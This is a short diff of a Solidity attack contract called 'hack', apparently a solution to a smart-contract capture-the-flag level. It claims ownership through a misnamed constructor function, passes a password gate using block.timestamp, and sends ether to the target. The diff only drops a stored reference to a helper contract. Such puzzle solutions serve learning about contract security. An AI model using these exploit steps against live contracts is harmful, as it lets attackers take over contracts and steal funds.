@@ -95,7 +95,6 @@ interface ITarget {
 }
 contract hack {
     ITarget immutable target;
-    ITrick public trick;
     uint public password;
     constructor(ITarget _ITarget) {
         target = _ITarget;
@@ -104,7 +103,6 @@ contract hack {
     function hit () external payable {
         target.construct0r();
         target.createTrick();
-        trick = target.trick();
         password = block.timestamp;
         target.getAllowance(password);
         address(target).call{value: 1 ether}("");
